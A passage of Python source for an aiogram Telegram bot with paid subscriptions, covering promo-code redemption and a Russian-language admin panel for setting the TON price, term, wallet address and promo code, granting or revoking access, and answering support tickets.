        days = int(await get_setting("promo_days", "30"))
        now = int(time.time())
        db = await db_connect()
        try:
            cur = await db.execute("SELECT expires_at FROM subscriptions WHERE user_id=?", (message.from_user.id,))
            row = await cur.fetchone()
            base = max(now, int(row["expires_at"])) if row else now
            expires = base + days * 86400
            
            await db.execute(
                "INSERT INTO subscriptions(user_id, expires_at, source, tier) VALUES(?, ?, 'promo', 'dynamic') "
                "ON CONFLICT(user_id) DO UPDATE SET expires_at=excluded.expires_at, source='promo', tier='dynamic'",
                (message.from_user.id, expires),
            )
            await db.commit()
        finally: await db.close()

        exp_text = time.strftime("%d.%m.%Y %H:%M", time.localtime(expires))
        await message.answer(f"🎉 <b>Кодовое слово принято!</b>\n\nВам выдан доступ на <b>{days} дн.</b>\nДействует до: <code>{exp_text}</code>")
        return

    if await has_access(message.from_user.id):
        await message.answer("✅ У вас есть доступ. Нажмите /start для меню.")

# ============================================================
# АДМИН-ПАНЕЛЬ
# ============================================================

def admin_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⚙️ Настройки", style="primary", callback_data="admin_settings")],
        [InlineKeyboardButton(text="🎟 Кодовое слово", style="primary", callback_data="admin_promo")],
        [InlineKeyboardButton(text="➕ Выдать доступ", style="success", callback_data="admin_free_add")],
        [InlineKeyboardButton(text="➖ Забрать доступ", style="danger", callback_data="admin_revoke")],
    ])

@dp.message(F.text.startswith("/admin"))
async def admin_panel(message: Message):
    if message.from_user.id != ADMIN_ID: 
        return
        
    # Сбрасываем зависшие состояния
    ADMIN_STATES.pop(message.from_user.id, None)
    
    try:
        price = await get_setting("subscription_price_ton", str(DEFAULT_SUBSCRIPTION_PRICE))
        days = await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS))
        address = await get_setting("ton_address", DEFAULT_TON_ADDRESS)
        
        await message.answer(
            f"<b>🔧 Админ-панель</b>\n\n"
            f"Цена: <b>{price} TON</b>\n"
            f"Срок: <b>{days} дн.</b>\n"
            f"TON-адрес: <code>{address or 'не задан'}</code>", 
            reply_markup=admin_keyboard()
        )
    except Exception as e:
        await message.answer(f"❌ <b>Ошибка БД:</b> <code>{e}</code>\n\nУдали файл access.db на хостинге и перезапусти бота.")

@dp.callback_query(F.data == "admin_back")
async def admin_back(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID: return
    try: await callback.message.edit_text("<b>🔧 Админ-панель</b>\n\nВыберите действие:", reply_markup=admin_keyboard())
    except TelegramBadRequest: pass

@dp.callback_query(F.data == "admin_settings")
async def admin_settings(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID: return
    price = await get_setting("subscription_price_ton", str(DEFAULT_SUBSCRIPTION_PRICE))
    days = await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS))
    address = await get_setting("ton_address", DEFAULT_TON_ADDRESS)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"Цена: {price} TON", callback_data="admin_set_price")],
        [InlineKeyboardButton(text=f"Срок: {days} дн.", callback_data="admin_set_days")],
        [InlineKeyboardButton(text="TON-адрес", style="primary", callback_data="admin_set_address")],
        [InlineKeyboardButton(text="Назад", style="primary", callback_data="admin_back")],
    ])
    try: await callback.message.edit_text(f"<b>⚙️ Настройки</b>\n\nЦена: <b>{price} TON</b>\nСрок: <b>{days} дн.</b>\nАдрес: <code>{address or 'не задан'}</code>", reply_markup=keyboard)
    except TelegramBadRequest: pass

@dp.callback_query(F.data == "admin_promo")
async def admin_promo(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID: return
    code = await get_setting("promo_code", "BONUS2024")
    days = await get_setting("promo_days", "30")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Изменить код", style="primary", callback_data="admin_set_promo_code")],
        [InlineKeyboardButton(text="Изменить дни", style="primary", callback_data="admin_set_promo_days")],
        [InlineKeyboardButton(text="Назад", style="primary", callback_data="admin_back")],
    ])
    try: await callback.message.edit_text(f"<b>🎟 Кодовое слово</b>\n\nТекущий код: <code>{code}</code>\nВыдает дней: <b>{days}</b>", reply_markup=kb)
    except TelegramBadRequest: pass

@dp.callback_query(F.data.in_({"admin_set_price", "admin_set_days", "admin_set_address", "admin_free_add", "admin_revoke", "admin_set_promo_code", "admin_set_promo_days"}))
async def admin_setting_prompt(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID: return
    mapping = {
        "admin_set_price": ("price", "Отправь новую цену в TON (например: 1.5)"),
        "admin_set_days": ("days", "Отправь срок подписки в днях (например: 30)"),
        "admin_set_address": ("address", "Отправь новый TON-адрес для приёма оплаты."),
        "admin_free_add": ("free_add", "Отправь Telegram ID пользователя."),
        "admin_revoke": ("revoke", "Отправь Telegram ID для удаления доступа."),
        "admin_set_promo_code": ("promo_code", "Отправь новое кодовое слово (например: BONUS2024)"),
        "admin_set_promo_days": ("promo_days", "Сколько дней доступа выдавать за код? (например: 30)"),
    }
    state, prompt = mapping[callback.data]
    ADMIN_STATES[callback.from_user.id] = state
    try: await callback.message.edit_text(f"<b>Изменение настройки</b>\n\n{prompt}\n\n/cancel — отмена")
    except TelegramBadRequest: pass
    await callback.answer()

@dp.message(F.text == "/cancel")
async def admin_cancel(message: Message):
    if message.from_user.id == ADMIN_ID and message.from_user.id in ADMIN_STATES:
        ADMIN_STATES.pop(message.from_user.id, None)
        await message.answer("Отменено. /admin — панель.")

@dp.message(F.from_user.id == ADMIN_ID)
async def admin_state_input(message: Message):
    state = ADMIN_STATES.get(message.from_user.id)
    if not state or not message.text: return
    value = message.text.strip()
    
    try:
        if isinstance(state, dict) and state.get("state") == "replying_ticket":
            user_id = state["user_id"]
            ticket_id = state["ticket_id"]
            try:
                await bot.send_message(user_id, f"<b>✉️ Ответ по вашей заявке #{ticket_id}:</b>\n\n{value}", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="В панель", style="primary", callback_data="user_panel")]]))
                await message.answer("✅ Ответ успешно отправлен пользователю!")
            except Exception as e:
                await message.answer(f"❌ Не удалось отправить ответ:\n{e}")
            ADMIN_STATES.pop(message.from_user.id, None)
            return

        if state == "price":
            price = Decimal(value.replace(",", "."))
            if price <= 0: raise ValueError
            await set_setting("subscription_price_ton", format_ton(price))
            await message.answer(f"✅ Цена изменена: <b>{format_ton(price)} TON</b>")
        elif state == "days":
            days = int(value)
            if days <= 0 or days > 3650: raise ValueError
            await set_setting("subscription_days", days)
            await message.answer(f"✅ Срок изменён: <b>{days} дн.</b>")
        elif state == "address":
            if len(value) < 20 or " " in value: raise ValueError
            await set_setting("ton_address", value)
            await message.answer("✅ TON-адрес сохранён.")
        elif state == "free_add":
            user_id = int(value)
            await add_free_access(user_id)
            await message.answer(f"✅ Бесплатный доступ выдан ID <code>{user_id}</code>.")
        elif state == "revoke":
            user_id = int(value)
            await revoke_user_access(user_id)
            await message.answer(f"✅ Доступ забран у ID <code>{user_id}</code>.")
        elif state == "promo_code":
            await set_setting("promo_code", value)
            await message.answer(f"✅ Кодовое слово изменено на: <code>{value}</code>")
        elif state == "promo_days":
            days = int(value)
            if days <= 0: raise ValueError
            await set_setting("promo_days", days)
            await message.answer(f"✅ За код теперь выдается: <b>{days} дн.</b>")
        else: 
            return
        ADMIN_STATES.pop(message.from_user.id, None)
    except (ValueError, InvalidOperation):
        await message.answer("❌ Неверное значение. Попробуй ещё раз или /cancel.")

# ============================================================
# ЗАПУСК
# ============================================================

async def main():
    await init_db()
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot, allowed_updates=["message", "business_message", "callback_query", "pre_checkout_query"])

if __name__ == "__main__":
    asyncio.run(main())
